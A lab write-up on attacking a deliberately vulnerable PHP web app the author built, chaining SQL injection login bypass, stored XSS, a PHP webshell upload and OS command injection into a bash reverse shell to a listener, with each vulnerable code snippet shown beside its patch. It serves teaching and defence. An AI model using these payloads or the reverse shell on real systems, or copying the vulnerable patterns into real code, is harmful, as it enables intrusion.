---
title: "Web App Exploitation"
categories: Lab
tags: pentesting web-security white-box
toc: true
mermaid: ture
---

Before discussing the specific exploits, let’s point out the premise of this environment. I developed a custom web application named TechNest, intentionally planting OWASP Top 10 vulnerabilities into the PHP source to serve as a white-box testing environment. Because I wrote the codebase myself, it makes it completely unnecessary for me to run reconnaissance tools like Nmap or Gobuster; I already know exactly how the logic handles input.

Keeping that in mind, the attack path here is not merely a set of isolated bugs, but rather a chained server compromise. The first thing that made the full attack possible was an SQL Injection to bypass authentication. By hijacking an administrative session, it unlocks the profile and diagnostic endpoints. Because those endpoints have loose conditions, it allows me to send bad inputs to unrestricted file upload and OS command injection functions, eventually establishing an interactive reverse shell.

I will demonstrate exactly where the code was vulnerable, how the exploit leveraged that specific line of code, and how the patched implementation secures it.

### 1. SQL Injection (A03:2021-Injection)

**The Exploit:**
I targeted the authentication mechanism by sending a malicious POST request to the `/login.php` endpoint. ![](/assets/images/lab/masar-final-project/07_sqli_login_page_baseline.png) Through Burp Suite and the browser, I injected the payload `admin' -- -` into the username field. ![](/assets/images/lab/masar-final-project/11_sqli_auth_bypass_payload_input.png) This effectively bypassed the authentication form without a valid password, logging me in as the admin and returning an HTTP 302 redirect to the index page. ![](/assets/images/lab/masar-final-project/13_sqli_auth_bypass_burp_302_redirect.png)

**The Root Cause:**

The first thing that made the attack possible was the direct concatenation of user input into the SQL string. I had made the web app code vulnerable this way:

PHP


```

$username = $_POST['username'];
$password = hash('sha256', $_POST['password']);
$query = "SELECT * FROM users WHERE username = '$username' AND password_hash = '$password'";
$result = mysqli_query($conn, $query);

```

In line `$query = "SELECT * FROM users WHERE username = '$username' AND password_hash = '$password'";` it takes the raw username and password variables and drops them straight into the `WHERE` clause. Because the input is not sanitized or parameterized, it allows me to send a bad username string like `admin' -- -` which breaks out of the single quotes and comments out the rest of the password validation logic entirely.

**The Patch:**

Based on the exact vulnerable code line, I applied the safe code:

PHP


```

$stmt = $conn->prepare("SELECT * FROM users WHERE username = ? AND password_hash = ?");
$password_hash = hash('sha256', $_POST['password']);
$stmt->bind_param("ss", $_POST['username'], $password_hash);
$stmt->execute();
$result = $stmt->get_result();

```

I swapped out the string concatenation for a prepared statement. As per the line code `$stmt = $conn->prepare("SELECT * FROM users WHERE username = ? AND password_hash = ?");`, the query structure is pre-compiled by the database. Then, in line `$stmt->bind_param("ss", $_POST['username'], $password_hash);`, it binds the inputs strictly as data values.

Note: By separating the SQL syntax from the user-provided data, the database treats the payload as a literal string rather than an executable command, making the authentication bypass impossible.

### 2. Stored Cross-Site Scripting (A03:2021-Injection)

**The Exploit:**
I submitted a malicious review on the product page (`/product.php?id=1`). ![](/assets/images/lab/masar-final-project/15_xss_product_review_form.png) I inserted the payload `<script>alert(123)</script>` into the review text field. ![](/assets/images/lab/masar-final-project/16_xss_alert_payload_input.png) When the page was reloaded, the application rendered the script, popping an alert box in the browser and proving client-side code execution. ![](/assets/images/lab/masar-final-project/17_xss_alert_popup_execution.png)

**The Root Cause:**

The first thing that made the attack possible was trusting database content when rendering the DOM. I had made the web app code vulnerable this way:

PHP


```

$review_body = $row['body'];
echo "" . $review_body . "";

```

In line `echo "<p>" . $review_body . "</p>";` it takes the review content directly from the database and echoes it to the page. Because the output lacks any safe encoding, it allows me to send bad characters like `<` and `>` which the victim's browser blindly parses and executes as active HTML and JavaScript when the page loads.

**The Patch:**

Based on the exact vulnerable code line, I applied the safe code:

PHP


```

$review_body = htmlspecialchars($row['body'], ENT_QUOTES, 'UTF-8');
echo "" . $review_body . "";

```

As per the line code `$review_body = htmlspecialchars($row['body'], ENT_QUOTES, 'UTF-8');`, it intercepts the database string before it hits the page. This function converts special characters into HTML entities (e.g., `<` becomes `&lt;`).

Note: Converting these characters guarantees that the browser renders the payload as harmless static text rather than executing it as a script within the victim's session context.

### 3. Unrestricted File Upload (A04:2021-Insecure Design)

**The Exploit:**
I accessed the profile update functionality at `POST /account.php`. Instead of an image, I uploaded a PHP webshell named `shell.php` containing `<?php system($_GET["cmd"]); ?>`. ![](/assets/images/lab/masar-final-project/28_file_upload_shell_php_selected.png) ![](/assets/images/lab/masar-final-project/29_file_upload_burp_multipart_post.png) After uploading, I accessed the file at `/uploads/shell.php?cmd=id`, which executed the `id` command and returned `uid=33(www-data)` in Burp Repeater. ![](/assets/images/lab/masar-final-project/33_webshell_repeater_cmd_id.png)

**The Root Cause:**

The first thing that made the attack possible was blindly trusting the user-controlled filename and extension. I had made the web app code vulnerable this way:

PHP


```

$target_dir = "uploads/";
$target_file = $target_dir . basename($_FILES["avatar"]["name"]);
move_uploaded_file($_FILES["avatar"]["tmp_name"], $target_file);

```

In line `$target_file = $target_dir . basename($_FILES["avatar"]["name"]);` it takes the exact filename supplied by the user. Because the code does not strictly validate the file's internal MIME type or restrict extensions before executing `move_uploaded_file`, it allows me to upload a `.php` script directly into a web-accessible directory.

**The Patch:**

Based on the exact vulnerable code line, I applied the safe code:

PHP


```

$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime = finfo_file($finfo, $_FILES["avatar"]["tmp_name"]);
if (in_array($mime, ['image/jpeg', 'image/png', 'image/gif'])) {
$new_filename = bin2hex(random_bytes(8)) . '.png';
move_uploaded_file($_FILES["avatar"]["tmp_name"], "uploads/" . $new_filename);
} else {
die("Only JPG, PNG, and GIF images are allowed");
}

```

I overhauled the upload logic. In line `$mime = finfo_file($finfo, $_FILES["avatar"]["tmp_name"]);` it takes the temporary file and strictly inspects its internal MIME type. Then, as per the line code `$new_filename = bin2hex(random_bytes(8)) . '.png';`, the application completely discards the user-supplied filename and replaces it with a randomized byte string and a hardcoded `.png` extension.

Note: By discarding the original filename and strictly verifying the file signature, the ability to upload and trigger executable scripts in the uploads directory is completely removed.

### 4. OS Command Injection (A03:2021-Injection)

**The Exploit:**
I used the order tracking feature at `POST /diagnostics.php`. By injecting a shell separator into the `order_id` parameter, I sent the payload `127.0.0.1 ; id`. ![](/assets/images/lab/masar-final-project/38_cmdi_diagnostics_burp_id_injection.png) I escalated this by sending a full bash reverse shell payload: `bash -c 'bash -i 5<> /dev/tcp/192.168.230.130/4444 0<&5 1>&5 2>&5'`. ![](/assets/images/lab/masar-final-project/39_revshell_browser_diagnostics_payload.png) This successfully forced the server to connect back to my Netcat listener, granting me interactive command execution. ![](/assets/images/lab/masar-final-project/41_revshell_nc_session_established.png)

**The Root Cause:**

The first thing that made the attack possible was passing user input directly to the system shell. I had made the web app code vulnerable this way:

PHP


```

$order_id = $_POST['order_id'];
$output = shell_exec("ping -c 1 " . $order_id);
echo "" . $output . "";

```

In line `$output = shell_exec("ping -c 1 " . $order_id);` it takes the `$order_id` parameter and concatenates it straight into a bash command. Because the input is not validated or sanitized, it allows me to send a bad payload utilizing shell metacharacters like `;` to break out of the `ping` command and execute subsequent arbitrary system commands as the `www-data` user.

**The Patch:**

Based on the exact vulnerable code line, I applied the safe code:

PHP


```

$order_id = $_POST['order_id'];
if (preg_match('/^[a-zA-Z0-9.]+$/', $order_id)) {
$descriptorspec = [1 => ["pipe", "w"], 2 => ["pipe", "w"]];
$process = proc_open(['/usr/bin/ping', '-c', '1', $order_id], $descriptorspec, $pipes);
$output = stream_get_contents($pipes[1]);
echo "" . htmlspecialchars($output, ENT_QUOTES, 'UTF-8') . "";
}

```

I removed the `shell_exec()` string concatenation entirely. First, in line `if (preg_match('/^[a-zA-Z0-9.]+$/', $order_id))` it enforces strict alphanumeric input validation. Furthermore, as per the line code `$process = proc_open(['/usr/bin/ping', '-c', '1', $order_id], $descriptorspec, $pipes);`, the command and its arguments are explicitly passed as an array.

Note: `proc_open` handles the arguments directly and bypasses the shell interpreter completely, meaning shell metacharacters are treated merely as literal strings, neutralizing any command injection attempt.

Thank you for reading!
